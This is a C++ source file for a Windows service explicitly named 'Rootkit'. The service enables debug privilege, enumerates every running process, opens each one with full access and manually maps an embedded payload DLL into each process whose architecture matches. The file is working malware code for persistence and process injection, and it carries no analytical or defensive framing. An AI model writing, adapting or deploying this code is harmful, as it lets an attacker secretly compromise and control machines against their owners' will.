#include "service.h"
#include "injector.h"
#include "payload.h"

#include <tlhelp32.h>
#include <tchar.h>

#define SVC_NAME TEXT("Rootkit")

namespace rootkit
{
    SERVICE_STATUS_HANDLE service_status_handle_;
    SERVICE_STATUS service_status_;
    HANDLE stop_event_;

    extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD arg_c, LPWSTR * arg_v)
    {
        Init(arg_c, arg_v);
    }

    auto Init(DWORD arg_c, LPWSTR* arg_v) -> void
    {
        service_status_handle_ = RegisterServiceCtrlHandler(SVC_NAME, (LPHANDLER_FUNCTION)ServiceHandler);

        service_status_.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
        service_status_.dwServiceSpecificExitCode = 0;

        UpdateServiceStatus(SERVICE_START_PENDING);
        ExecuteServiceCode();
    }

    auto UpdateServiceStatus(const DWORD current_state) -> VOID
    {
        service_status_.dwCurrentState = current_state;
        SetServiceStatus(service_status_handle_, &service_status_);
    }

    auto ServiceHandler(DWORD control_code, DWORD event_type, LPVOID event_data, LPVOID context) -> DWORD
    {
        switch (control_code)
        {
        case SERVICE_CONTROL_STOP:
            service_status_.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stop_event_);
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            service_status_.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stop_event_);
            break;
        case SERVICE_CONTROL_PAUSE:
            service_status_.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            service_status_.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
        }

        UpdateServiceStatus(SERVICE_RUNNING);

        return NO_ERROR;
    }

    auto ExecuteServiceCode() -> VOID
    {
        stop_event_ = CreateEvent(NULL, TRUE, FALSE, NULL);
        UpdateServiceStatus(SERVICE_RUNNING);

        // While heartbeat
        while (!DeployPayload()) {}

        while (true)
        {
            WaitForSingleObject(stop_event_, INFINITE);
            UpdateServiceStatus(SERVICE_STOPPED);
            return;
        }
    }

    auto DeployPayload() -> bool
    {
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;

        TOKEN_PRIVILEGES priv = { 0 };
        HANDLE hToken = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            priv.PrivilegeCount = 1;
            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
                AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

            CloseHandle(hToken);
        }
        
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(hProcessSnap, &pe32))
        {
            return false;
        }
        
        do
        {
            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (!hProc) {
                continue;
            }

            if (!IsCorrectTargetArchitecture(hProc)) {
                CloseHandle(hProc);
                continue;
            }

            if (!ManualMapDll(hProc, reinterpret_cast<BYTE*>(payload))) {
                CloseHandle(hProc);
                CloseHandle(hProcessSnap);
                return true;
            }

            CloseHandle(hProc);
        } while (Process32Next(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
        return true;
    }
}